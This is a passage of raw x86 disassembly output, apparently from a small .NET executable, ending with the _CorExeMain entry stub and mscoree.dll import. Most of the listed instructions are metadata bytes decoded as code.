  40d055:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40d05b:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40d061:	12 60 1d             	adc    0x1d(%eax),%ah
  40d064:	0e                   	push   %cs
  40d065:	0e                   	push   %cs
  40d066:	08 12                	or     %dl,(%edx)
  40d068:	60                   	pusha
  40d069:	08 05 07 01 12 81    	or     %al,0x81120107
  40d06f:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d074:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40d07b:	05 08 08 06 00       	add    $0x60808,%eax
  40d080:	02 07                	add    (%edi),%al
  40d082:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d087:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d08e:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d094:	00 02                	add    %al,(%edx)
  40d096:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d09c:	02 0b                	add    (%ebx),%cl
  40d09e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d0a3:	02 06                	add    (%esi),%al
  40d0a5:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d0aa:	02 0a                	add    (%edx),%cl
  40d0ac:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d0b1:	03 12                	add    (%edx),%edx
  40d0b3:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d0ba:	07 02 12 
  40d0bd:	60                   	pusha
  40d0be:	02 04 07             	add    (%edi,%eax,1),%al
  40d0c1:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d0c7:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d0cc:	04 1d                	add    $0x1d,%al
  40d0ce:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d0d3:	06                   	push   %es
  40d0d4:	07                   	pop    %es
  40d0d5:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d0db:	00 01                	add    %al,(%ecx)
  40d0dd:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d0e2:	06                   	push   %es
  40d0e3:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d0e9:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d0ef:	05 08 20 02 01       	add    $0x1022008,%eax
  40d0f4:	12 61 11             	adc    0x11(%ecx),%ah
  40d0f7:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d0fb:	04 12                	add    $0x12,%al
  40d0fd:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d104:	1d 05 00 
  40d107:	00 30                	add    %dh,(%eax)
  40d109:	d1 00                	roll   $1,(%eax)
	...
  40d113:	00 4e d1             	add    %cl,-0x2f(%esi)
  40d116:	00 00                	add    %al,(%eax)
  40d118:	00 20                	add    %ah,(%eax)
	...
  40d12e:	00 00                	add    %al,(%eax)
  40d130:	40                   	inc    %eax
  40d131:	d1 00                	roll   $1,(%eax)
	...
  40d13f:	00 00                	add    %al,(%eax)
  40d141:	00 5f 43             	add    %bl,0x43(%edi)
  40d144:	6f                   	outsl  %ds:(%esi),(%dx)
  40d145:	72 45                	jb     0x40d18c
  40d147:	78 65                	js     0x40d1ae
  40d149:	4d                   	dec    %ebp
  40d14a:	61                   	popa
  40d14b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d152:	72 65                	jb     0x40d1b9
  40d154:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d158:	6c                   	insb   (%dx),%es:(%edi)
  40d159:	00 00                	add    %al,(%eax)
  40d15b:	00 00                	add    %al,(%eax)
  40d15d:	00 ff                	add    %bh,%bh
  40d15f:	25 00 20 40 00       	and    $0x402000,%eax
